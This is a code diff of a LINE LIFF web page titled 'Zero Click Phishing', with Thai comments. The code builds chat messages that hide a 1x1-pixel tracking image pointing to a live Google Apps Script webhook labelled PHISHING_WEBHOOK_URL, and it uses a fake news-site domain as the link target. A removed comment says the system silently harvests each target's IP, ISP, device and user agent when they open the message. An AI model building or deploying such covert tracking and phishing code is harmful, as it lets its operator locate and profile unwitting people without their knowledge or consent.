@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zero Click Phishing</title>
     <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;700&display=swap" rel="stylesheet">
-    <!-- Line LIFF SDK  -->
+    <!-- Line LIFF SDK -->
     <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
     <style>
         * {
@@ -373,14 +373,6 @@
                 <div class="tips">
                     <p><strong>คำแนะนำ:</strong> รูปภาพควรมีขนาดเหมาะสม เพื่อการโหลดที่รวดเร็ว</p>
                 </div>
-
-                <!-- เพิ่มส่วนอธิบายวิธีการทำงานของระบบ Zero Click -->
-                <div class="message-box" style="background-color: #e8f4ff; border-left: 4px solid #2196F3;">
-                    <p><strong>ระบบ Zero Click คืออะไร?</strong></p>
-                    <p>เมื่อเป้าหมายเปิดอ่านข้อความที่มีรูปภาพที่คุณส่งไป ระบบจะเก็บข้อมูลของเป้าหมายโดยอัตโนมัติ โดยที่เป้าหมายไม่ต้องคลิกที่รูปภาพ</p>
-                    <p>ข้อมูลที่จะได้รับ: IP, ผู้ให้บริการอินเทอร์เน็ต, อุปกรณ์, User Agent และข้อมูลอื่นๆ</p>
-                </div>
-
             </div>
         </div>
         
@@ -407,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx_iz_GUtDWWX_6Ml_Oq-vLPEx5w7WheY72eZHuG_EMuBPVsna6dLP5W67e3759G7Li/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/u/2/s/AKfycbx_iz_GUtDWWX_6Ml_Oq-vLPEx5w7WheY72eZHuG_EMuBPVsna6dLP5W67e3759G7Li/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -828,30 +820,25 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง URL สำหรับการติดตาม Zero Click
-                // ใช้ URL ที่มีจุดหมายเป็นรูปภาพโปร่งใสโดยตรง แทนการใช้ Google Script endpoint
-                // โดยเพิ่ม query parameters สำหรับ tracking
+                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน zeroClickTrackUrl
+                const deviceInfo = getEnhancedDeviceInfo();
+                const ipInfo = await getIPInfo();
+                
+                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลขั้นสูง
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}`;
                 
-                // ใช้ URL ของรูปภาพโปร่งใสจาก imgbb หรือ CDN อื่นๆ ที่เร็วกว่า
-                // และเพิ่ม query parameters สำหรับ tracking โดยใช้ redirector service
-                const trackRedirectUrl = `https://iplogger.org/invisible/`;
-                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&r=${randomSuffix}`;
-                
-                // เลือกใช้รูปภาพโปร่งใสจาก CDNs ที่เชื่อถือได้และโหลดเร็ว
-                const transparentPixelUrl = 'https://upload.wikimedia.org/wikipedia/commons/c/ca/1x1.png'; 
-                // หรือใช้ data URI แทน URL เพื่อป้องกันปัญหาการโหลดจากภายนอก
-                const dataURITransparentPixel = 'data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
+                // เพิ่ม random parameter เพื่อป้องกันการแคช
+                zeroClickTrackUrl += `&r=${randomSuffix}`;
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message โดยใช้โครงสร้างที่เหมาะสมกับ LINE
+                // สร้าง Flex Message ที่มีรูปภาพขนาด 1x1 pixel แบบซ่อนเพื่อให้เกิด Zero Click
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
-                        size: 'mega',
                         hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
                             url: imageUrl,
@@ -869,27 +856,18 @@
                             contents: [
                                 {
                                     type: 'image',
-                                    url: dataURITransparentPixel,
-                                    size: '1px',
+                                    url: zeroClickTrackUrl, // URL ของ Zero Click tracking (จะถูกโหลดโดยอัตโนมัติเมื่อเปิดข้อความ)
+                                    size: 'xxs',
                                     aspectRatio: '1:1',
-                                    aspectMode: 'fit'
-                                },
-                                {
-                                    type: 'box',
-                                    layout: 'vertical',
-                                    contents: [
-                                        {
-                                            type: 'image',
-                                            url: `${transparentPixelUrl}?key=${trackingKey}&r=${randomSuffix}`,
-                                            size: '1px',
-                                            aspectRatio: '1:1',
-                                            aspectMode: 'fit'
-                                        }
-                                    ],
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetBottom: '0px',
+                                    offsetEnd: '0px',
+                                    width: '1px',
                                     height: '1px'
                                 }
                             ],
-                            spacing: 'none',
+                            paddingAll: '0px',
                             height: '1px'
                         }
                     }
@@ -903,9 +881,10 @@
                     console.log("ShareTargetPicker result:", result);
 
                     if (result) {
+                        // แชร์สำเร็จ - บันทึก Tracking Key Mapping และอื่นๆ
                         showStatus('แชร์รูปภาพสำเร็จ', true);
                         
-                        // บันทึก Tracking Key Mapping หลังจากแชร์สำเร็จแล้วเท่านั้น
+                        // บันทึก Tracking Key Mapping หลังจากแชร์สำเร็จ
                         try {
                             const saved = await saveTrackingCaseMapping(trackingKey, caseName);
                             if (!saved) {
@@ -913,16 +892,6 @@
                             } else {
                                 console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
                             }
-                            
-                            // ทำการร้องขอ Zero Click tracking ไปยัง Google Script Web App
-                            // ด้วยการยิง request ตรงออกไปจาก client โดยตรง
-                            fetch(zeroClickTrackUrl, {
-                                method: 'GET',
-                                mode: 'no-cors'  // ป้องกันปัญหา CORS
-                            })
-                            .then(() => console.log("Zero Click tracking request sent from client"))
-                            .catch(err => console.error("Zero Click request error:", err));
-                            
                         } catch (saveError) {
                             console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
                             showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
@@ -978,13 +947,13 @@
         function generateUniqueId() {
             return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
         }
-        
+
         // ฟังก์ชันดึงข้อมูลอุปกรณ์สำหรับส่งไปกับ ZeroClick
         function getEnhancedDeviceInfo() {
             const ua = navigator.userAgent;
             let deviceInfo = {
                 platform: "ไม่ทราบ",
-                browser: "ไม่ทราบ",
+                browser: "ไม่ทราบ", 
                 deviceType: "ไม่ทราบ",
                 deviceModel: "ไม่ทราบ",
                 screenSize: `${window.screen.width}x${window.screen.height}`,
@@ -1072,17 +1041,17 @@
             
             return deviceInfo;
         }
-        
+
         // ฟังก์ชันดึงข้อมูลการเชื่อมต่อ
         function getConnectionInfo() {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            
             if (!connection) {
                 return {
                     type: "unknown",
                     effectiveType: "unknown",
                     downlink: null,
-                    rtt: null,
-                    saveData: false
+                    rtt: null
                 };
             }
             
@@ -1094,7 +1063,7 @@
                 saveData: connection.saveData || false
             };
         }
-        
+
         // ฟังก์ชันดึงข้อมูล IP ผ่าน API (ทำงานแบบ best-effort)
         async function getIPInfo() {
             try {
